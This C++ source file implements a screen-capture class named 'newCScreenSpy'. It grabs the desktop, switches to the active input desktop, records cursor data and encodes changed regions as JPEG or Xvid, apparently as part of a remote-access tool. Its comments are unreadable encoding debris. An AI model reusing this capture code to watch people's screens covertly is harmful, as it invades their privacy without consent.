// ScreenSpy.cpp: implementation of the newCScreenSpy class.
//
//////////////////////////////////////////////////////////////////////

#include "newScreenSpy.h"
#include "until.h"

#define RGB2GRAY(r,g,b) (((b)*117 + (g)*601 + (r)*306) >> 10)

#define DEF_YSTEP	10
#define DEF_XSTEP	32

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

#ifdef _CONSOLE
#include <stdio.h>
#endif

newCScreenSpy::newCScreenSpy(int biBitCount, bool bIsGray, UINT nMaxFrameRate)
{
	switch (biBitCount)
	{
	case 1:
	case 4:
	case 8:
	case 16:
	case 32:
		m_biBitCount = biBitCount;
		break;
	default:
		m_biBitCount = 32;
	}
	
	if (!SelectInputWinStation())
	{
		m_hDeskTopDC = GetDC(NULL);
	}
	
	QueryPerformanceFrequency(&m_liFreq);
	
	m_dwBitBltRop	= SRCCOPY;
	m_bAlgorithm	= ALGORITHM_HOME; // Ĭ��ʹ�ü��ð칫�㷨
	m_nMaxFrameRate	= nMaxFrameRate;
	m_liFreq.QuadPart /= nMaxFrameRate;
	m_bIsGray		= bIsGray;
	m_nFullWidth	= ::GetDeviceCaps(m_hDeskTopDC, DESKTOPHORZRES);
	m_nFullHeight	= ::GetDeviceCaps(m_hDeskTopDC, DESKTOPVERTRES);
    m_nIncSize		= 32 / m_biBitCount;
	m_nScanLine		= 0;
	
	m_hLastMemDC	= ::CreateCompatibleDC(m_hDeskTopDC);
	m_hCurrMemDC	= ::CreateCompatibleDC(m_hDeskTopDC);
	m_hRectMemDC	= ::CreateCompatibleDC(m_hDeskTopDC);
	m_lpvLastBits	= NULL;
	m_lpvCurrBits	= NULL;
	
	m_lpbmi_full	= ConstructBitmapInfo(m_biBitCount, m_nFullWidth, m_nFullHeight);
	m_lpbmi_rect	= ConstructBitmapInfo(m_biBitCount, m_nFullWidth, m_nFullHeight);
	
	m_hLastBitmap	= ::CreateDIBSection(m_hDeskTopDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvLastBits, NULL, NULL);
	m_hCurrBitmap	= ::CreateDIBSection(m_hDeskTopDC, m_lpbmi_full, DIB_RGB_COLORS, &m_lpvCurrBits, NULL, NULL);
	
	::SelectObject(m_hLastMemDC, m_hLastBitmap);
	::SelectObject(m_hCurrMemDC, m_hCurrBitmap);
	
	// �㹻��
	m_changedBuffer = new BYTE[m_lpbmi_full->bmiHeader.biSizeImage * 2];
	m_changedOffset = 0;
	m_nPerLineDataSize = m_lpbmi_full->bmiHeader.biSizeImage / m_nFullHeight;
	m_XvidEnc.Open(m_nFullWidth, m_nFullHeight, m_nMaxFrameRate, m_biBitCount, 6);
}

newCScreenSpy::~newCScreenSpy()
{
	::ReleaseDC(NULL, m_hDeskTopDC);
	::DeleteDC(m_hRectMemDC);
	::DeleteDC(m_hCurrMemDC);
	::DeleteDC(m_hLastMemDC);
	
	::DeleteObject(m_hCurrBitmap);
	::DeleteObject(m_hLastBitmap);
	
	if (m_XvidEnc.m_bOpened)
		m_XvidEnc.Close();
	if (m_changedBuffer)
		delete[] m_changedBuffer;
	if (m_lpbmi_rect)
		delete[] m_lpbmi_rect;
	if (m_lpbmi_full)
		delete[] m_lpbmi_full;
}

LPVOID newCScreenSpy::getFirstScreen(LPDWORD lpdwBytes)
{
	if (lpdwBytes == NULL || m_changedBuffer == NULL)
		return NULL;
	
	// �л�����ǰ��������
	SelectInputWinStation();
	
	// ���ñ仯������ƫ��
	m_changedOffset = 0;
	
	// д��ʹ���������㷨
	BYTE	algorithm = (BYTE)m_bAlgorithm;
	WriteChangedBuffer((LPBYTE)&algorithm, sizeof(algorithm));
	
	// ��ȡ�����仯������
	::BitBlt(m_hLastMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hDeskTopDC, 0, 0, m_dwBitBltRop);
	if (algorithm == ALGORITHM_HOME)
	{
		void *bitstream = NULL; int bitstreamlen;
		bitstreamlen = BMP_JPG(m_nFullWidth, m_nFullHeight, m_biBitCount, 75, m_lpvLastBits, &bitstream);
		if (bitstreamlen > 0)
		{
			WriteChangedBuffer((LPBYTE)bitstream, bitstreamlen);
		}
		if (bitstream) free(bitstream);
	}
	else if (algorithm == ALGORITHM_XVID)
	{
		*lpdwBytes = m_XvidEnc.Encode(m_lpvLastBits, m_changedBuffer + m_changedOffset, m_lpbmi_full->bmiHeader.biSizeImage);
		if (*lpdwBytes > 0)
		{
			m_changedOffset += *lpdwBytes;
		}
	}
	*lpdwBytes = m_changedOffset;
	QueryPerformanceCounter(&m_liLast);
	return m_changedBuffer;
}

LPVOID newCScreenSpy::getNextScreen(LPDWORD lpdwBytes)
{
	if (lpdwBytes == NULL || m_changedBuffer == NULL)
		return NULL;
	
	// �л�����ǰ��������
	SelectInputWinStation();
	
	// ���ñ仯������ƫ��
	m_changedOffset = 0;
	
	// д��ʹ���������㷨
	BYTE	algorithm = (BYTE)m_bAlgorithm;
	WriteChangedBuffer((LPBYTE)&algorithm, sizeof(algorithm));
	
	// д�뵱ǰ����λ��
	POINT	CursorPos;
	GetCursorPos(&CursorPos);
	float	fDpiRatio = (float)m_nFullWidth / GetSystemMetrics(SM_CXSCREEN);
	CursorPos.x = fDpiRatio * CursorPos.x + 0.5f;
	CursorPos.y = fDpiRatio * CursorPos.y + 0.5f;
	WriteChangedBuffer((LPBYTE)&CursorPos, sizeof(POINT));
	
	// д�뵱ǰ��������
	BYTE	CursorIndex = m_CursorInfo.getCurrentCursorIndex();
	WriteChangedBuffer(&CursorIndex, sizeof(BYTE));
	
	// ��ȡ�����仯������
	::BitBlt(m_hCurrMemDC, 0, 0, m_nFullWidth, m_nFullHeight, m_hDeskTopDC, 0, 0, m_dwBitBltRop);
	if (algorithm == ALGORITHM_HOME)
	{
		ScanChangedRect(TRUE);
	}
	else if (algorithm == ALGORITHM_XVID)
	{
		*lpdwBytes = m_XvidEnc.Encode(m_lpvCurrBits, m_changedBuffer + m_changedOffset, m_lpbmi_full->bmiHeader.biSizeImage);
		if (*lpdwBytes > 0)
		{
			m_changedOffset += *lpdwBytes;
		}
	}
	*lpdwBytes = m_changedOffset;
	
	// ���Ʒ���֡���ٶ�
	//while (1)
	//{
	//	QueryPerformanceCounter(&m_liCurr);
	//	if (m_liCurr.QuadPart - m_liLast.QuadPart >= m_liFreq.QuadPart)
	//		break;
	//	Sleep(1);
	//}
	//QueryPerformanceCounter(&m_liLast);
	return m_changedBuffer;
}

BOOL newCScreenSpy::ScanChangedRect(BOOL bCopyChangedRect)
{
	LPDWORD p1, p2; RECT changedRect; HRGN hRgnChanged = NULL, hRgnCombine;
	
	for (int y = m_nScanLine; y < m_nFullHeight; y += DEF_YSTEP) // m_nScanLine Ϊ 0, �����һ��
	{
		p1 = (LPDWORD)((LPBYTE)m_lpvLastBits + (m_nFullHeight - 1 - y) * m_nPerLineDataSize);
		p2 = (LPDWORD)((LPBYTE)m_lpvCurrBits + (m_nFullHeight - 1 - y) * m_nPerLineDataSize);
		for (int x = 0; x < m_nFullWidth; )
		{
			if (*p1 == *p2)
			{
				p1++;
				p2++;
				x += m_nIncSize;
				continue;
			}
			if (!bCopyChangedRect)
				return TRUE;
			changedRect.left   = max(x - DEF_XSTEP, 0);
			changedRect.top    = max(y - DEF_YSTEP, 0);
			changedRect.right  = min(x + DEF_XSTEP, m_nFullWidth);
			changedRect.bottom = min(y + DEF_YSTEP, m_nFullHeight);
			if (hRgnChanged == NULL)
				hRgnChanged = CreateRectRgnIndirect(&changedRect);
			else
			{
				hRgnCombine = CreateRectRgnIndirect(&changedRect);
				CombineRgn(hRgnChanged, hRgnChanged, hRgnCombine, RGN_OR);
				DeleteObject(hRgnCombine);
			}
			p1 += DEF_XSTEP / m_nIncSize;
			p2 += DEF_XSTEP / m_nIncSize;
			x += DEF_XSTEP;
		}
	}
	
	m_nScanLine = (m_nScanLine + 3) % DEF_YSTEP;
	if (hRgnChanged)
	{
		DWORD dwRgnSize = GetRegionData(hRgnChanged, 0, NULL);
		LPRGNDATA lpRgnData = (LPRGNDATA) new BYTE[dwRgnSize];
		GetRegionData(hRgnChanged, dwRgnSize, lpRgnData);
		DeleteObject(hRgnChanged);
		CopyChangedRect(lpRgnData, dwRgnSize);
		delete[] lpRgnData;
		return TRUE;
	}
	return FALSE;
}

void newCScreenSpy::CopyChangedRect(LPRGNDATA lpRgnData, DWORD dwRgnSize)
{
	LPRECT lpChangedRect = (LPRECT)lpRgnData->Buffer;
	void *bitstream = NULL; int bitstreamlen;
	
	for (int i = 0; i < lpRgnData->rdh.nCount; i++)
	{
		int nChangedRectWidth = lpChangedRect[i].right - lpChangedRect[i].left;
		int nChangedRectHeight = lpChangedRect[i].bottom - lpChangedRect[i].top;
		
		m_lpbmi_rect->bmiHeader.biWidth = nChangedRectWidth;
		m_lpbmi_rect->bmiHeader.biHeight = nChangedRectHeight;
		m_lpbmi_rect->bmiHeader.biSizeImage = (((nChangedRectWidth * m_biBitCount + 31) & ~31) >> 3) * nChangedRectHeight;
		
		m_lpvRectBits = NULL;
		m_hRectBitmap = ::CreateDIBSection(m_hDeskTopDC, m_lpbmi_rect, DIB_RGB_COLORS, &m_lpvRectBits, NULL, NULL);
		::SelectObject(m_hRectMemDC, m_hRectBitmap);
		
		::BitBlt(m_hLastMemDC, lpChangedRect[i].left, lpChangedRect[i].top, nChangedRectWidth,
			nChangedRectHeight, m_hCurrMemDC, lpChangedRect[i].left, lpChangedRect[i].top, SRCCOPY);
		::BitBlt(m_hRectMemDC, 0, 0, nChangedRectWidth,
			nChangedRectHeight, m_hCurrMemDC, lpChangedRect[i].left, lpChangedRect[i].top, SRCCOPY);
		
		bitstreamlen = BMP_JPG(nChangedRectWidth, nChangedRectHeight, m_biBitCount, 75, m_lpvRectBits, &bitstream);
		if (bitstreamlen > 0)
		{
			WriteChangedBuffer((LPBYTE)&bitstreamlen, sizeof(int));
			WriteChangedBuffer((LPBYTE)bitstream, bitstreamlen);
			WriteChangedBuffer((LPBYTE)&lpChangedRect[i], sizeof(RECT));
		}
		::DeleteObject(m_hRectBitmap);
		if (bitstream) free(bitstream);
	}
}

int newCScreenSpy::BMP_JPG(int width, int height, int cbit, int quality, void *input, void **output)
{
	struct jpeg_compress_struct jcs;
	struct jpeg_error_mgr jem;
	unsigned long outlen = 0;
	
	// ���ô�����
	jcs.err = jpeg_std_error(&jem);
	// ����ѹ���ṹ
	jpeg_create_compress(&jcs);
	// ����д��(���)λ��
	jpeg_mem_dest(&jcs, (unsigned char **)output, &outlen);
	// ���ñ������
	switch (cbit)
	{
	case 16:
		jcs.in_color_space = JCS_EXT_RGB;
		jcs.input_components = 3;
		break;
	case 24:
		jcs.in_color_space = JCS_EXT_BGR;
		jcs.input_components = 3;
		break;
	case 32:
		jcs.in_color_space = JCS_EXT_BGRA;
		jcs.input_components = 4;
		break;
	default:
		jpeg_destroy_compress(&jcs);
		return -1;
	}
	jcs.image_width = width;
	jcs.image_height = height;
	// ��д����Ĭ�ϲ���
	jpeg_set_defaults(&jcs);
	// ����ͼ��Ʒ��, ȡֵ��Χ��[0-100], 0��ʾ�����ʣ�100��ʾ������
	jpeg_set_quality(&jcs, quality, true);
	// ��ʼѹ��ͼ��
	jpeg_start_compress(&jcs, true);
	int line_stride = (jcs.image_width * cbit / 8 + 3) / 4 * 4;
	while (jcs.next_scanline < jcs.image_height)
	{
		unsigned char *pline = (unsigned char *)input + jcs.next_scanline * line_stride;
		jpeg_write_scanlines(&jcs, &pline, 1);
	}
	// ���ͼ��ѹ��
	jpeg_finish_compress(&jcs);
	// �ͷ������Դ
	jpeg_destroy_compress(&jcs);
	
	return outlen;
}

void newCScreenSpy::WriteChangedBuffer(LPBYTE lpData, int nCount)
{
	memcpy(m_changedBuffer + m_changedOffset, lpData, nCount);
	m_changedOffset += nCount;
}

LPBITMAPINFO newCScreenSpy::ConstructBitmapInfo(int biBitCount, int biWidth, int biHeight)
{
	/*
	biBitCount Ϊ1 (�ڰ׶�ɫͼ) ��4 (16 ɫͼ) ��8 (256 ɫͼ) ʱ����ɫ������ָ����ɫ���С
	biBitCount Ϊ16 (16 λɫͼ) ��24 (���ɫͼ, ��֧��) ��32 (32 λɫͼ) ʱû����ɫ��
	*/
	int	color_num = biBitCount <= 8 ? 1 << biBitCount : 0;
	
	int nBISize = sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
	BITMAPINFO	*lpbmi = (BITMAPINFO *) new BYTE[nBISize];
	
	BITMAPINFOHEADER	*lpbmih = &(lpbmi->bmiHeader);
	lpbmih->biSize = sizeof(BITMAPINFOHEADER);
	lpbmih->biWidth = biWidth;
	lpbmih->biHeight = biHeight;
	lpbmih->biPlanes = 1;
	lpbmih->biBitCount = biBitCount;
	lpbmih->biCompression = BI_RGB;
	lpbmih->biXPelsPerMeter = 0;
	lpbmih->biYPelsPerMeter = 0;
	lpbmih->biClrUsed = 0;
	lpbmih->biClrImportant = 0;
	lpbmih->biSizeImage = (((lpbmih->biWidth * lpbmih->biBitCount + 31) & ~31) >> 3) * lpbmih->biHeight;
	
	// 16λ���Ժ��û����ɫ��ֱ�ӷ���
	if (biBitCount >= 16)
		return lpbmi;
	/*
	Windows 95��Windows 98�����lpvBits����ΪNULL����GetDIBits�ɹ��������BITMAPINFO�ṹ����ô����ֵΪλͼ���ܹ���ɨ��������
	
    Windows NT�����lpvBits����ΪNULL����GetDIBits�ɹ��������BITMAPINFO�ṹ����ô����ֵΪ��0���������ִ��ʧ�ܣ���ô������0ֵ��Windows NT�������ø��������Ϣ�������callGetLastError������
	*/
	
	HDC	hDC = GetDC(NULL);
	HBITMAP hBmp = CreateCompatibleBitmap(hDC, 1, 1); // �߿���Ϊ0
	GetDIBits(hDC, hBmp, 0, 0, NULL, lpbmi, DIB_RGB_COLORS);
	ReleaseDC(NULL, hDC);
	DeleteObject(hBmp);
	
	if (m_bIsGray)
	{
		for (int i = 0; i < color_num; i++)
		{
			int color = RGB2GRAY(lpbmi->bmiColors[i].rgbRed, lpbmi->bmiColors[i].rgbGreen, lpbmi->bmiColors[i].rgbBlue);
			lpbmi->bmiColors[i].rgbRed = lpbmi->bmiColors[i].rgbGreen = lpbmi->bmiColors[i].rgbBlue = color;
		}
	}
	
	return lpbmi;
}

LPBITMAPINFO newCScreenSpy::getBitmapInfo()
{
	return m_lpbmi_full;
}

UINT newCScreenSpy::getBitmapInfoSize()
{
	int	color_num = m_biBitCount <= 8 ? 1 << m_biBitCount : 0;
	
	return sizeof(BITMAPINFOHEADER) + (color_num * sizeof(RGBQUAD));
}

void newCScreenSpy::setAlgorithm(UINT nAlgorithm)
{
	InterlockedExchange((LPLONG)&m_bAlgorithm, nAlgorithm);
}

void newCScreenSpy::setCaptureLayer(BOOL bIsCaptureLayer)
{
	DWORD dwRop = SRCCOPY;
	if (bIsCaptureLayer)
		dwRop |= CAPTUREBLT;
	InterlockedExchange((LPLONG)&m_dwBitBltRop, dwRop);
}

BOOL newCScreenSpy::SelectInputWinStation()
{
	BOOL bRet = ::SwitchInputDesktop();
	if (bRet)
	{
		ReleaseDC(NULL, m_hDeskTopDC);
		m_hDeskTopDC = GetDC(NULL);
	}	
	return bRet;	
}

// ��ǰ������ȵ�
// LONG newCScreenSpy::getKeyBoardHotspotY()
// {
// 	static	DWORD	dwCurrentThreadId = GetCurrentThreadId();
// 	static	HWND	hWindow = GetForegroundWindow();
// 	static	DWORD	dwWindowThreadId = GetWindowThreadProcessId(hWindow, NULL);
// 	HWND	hCurrentWindow = GetForegroundWindow();
// 	if (hCurrentWindow != hWindow )
// 	{
// 		// Release
// 		AttachThreadInput(dwCurrentThreadId, dwWindowThreadId, FALSE);
// 		hWindow = hCurrentWindow;
// 		dwWindowThreadId = GetWindowThreadProcessId(hWindow, NULL);
// 		AttachThreadInput(dwCurrentThreadId, dwWindowThreadId, TRUE);
// 	}
// 	
// 	POINT	pt;
// 	if (GetCaretPos(&pt))
// 	{
// 		ClientToScreen(GetFocus(), &pt);
// 	}
// 	return pt.y;	
// }
